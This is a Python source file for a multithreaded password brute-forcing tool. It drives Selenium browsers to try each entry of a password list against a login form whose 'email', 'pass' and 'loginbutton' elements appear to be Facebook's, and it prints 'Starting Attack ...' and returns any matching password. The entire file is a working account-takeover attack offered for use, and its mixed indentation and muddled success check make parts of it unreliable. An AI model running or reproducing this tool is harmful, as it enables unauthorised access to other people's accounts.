# Date: 20/05/2020
# Author: theVirtualMan
# Description: brute_search
from selenium.webdriver.support.ui import WebDriverWait
from queue import Queue
from threading import Thread, RLock
import time
# from .const import display_size

class BruteSearch(object):
	
    account_exists = None ############################################
    password_found = None


    def __init__(self, username, passlist_path, url, browslist):
		
        self.username = username
        self.passlist_path = passlist_path
        self.url = url
        self.browslist = browslist
        self.passwords = Queue()
       	self.lock = RLock()
       	self.is_found = False

    def store_passlist(self):
    	
    	file_pointer = open(self.passlist_path)
    	
    	for file in file_pointer:
    		self.passwords.put(file.strip())
    	
    	file_pointer.close()

    def search(self, driver):

    	while self.passwords.qsize() and not self.is_found:
			    				
    		password = self.passwords.get()   		
    		
    		driver.get(self.url)
	    	WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
	    	elem = driver.find_element_by_name("email")
	    	elem.clear()
	    	elem.send_keys(self.username) 
	    	elem = driver.find_element_by_name("pass")
	    	elem.clear()
	    	elem.send_keys(password)
	    	driver.find_element_by_id('loginbutton').click()
    		
	    	if "Home" not in driver.page_source:
	    		self.passwords.put(password)
	    		continue

			# if "Invalid username or password" in driver.page_source:
	    	if "Forgot Password?" not in driver.page_source:
	        	BruteSearch.password_found = password
	        	self.is_found = True
    		
    		with self.lock:
    			print('password: ', password, ' doesn\'t match ....')

	    	# driver.get("https://api.ipify.org")

    
    def start(self):
    	
    	self.store_passlist()
    	threads = []
    	
    	print('Starting Attack ...')
    	for i,driver in enumerate(self.browslist):
    		threads.append(Thread(target = self.search, args = [driver]))
    		threads[i].start()

    	for thread in threads:
    		thread.join()

    	time.sleep(60)
    	for driver in self.browslist:
    		driver.quit()
			

    	return BruteSearch.password_found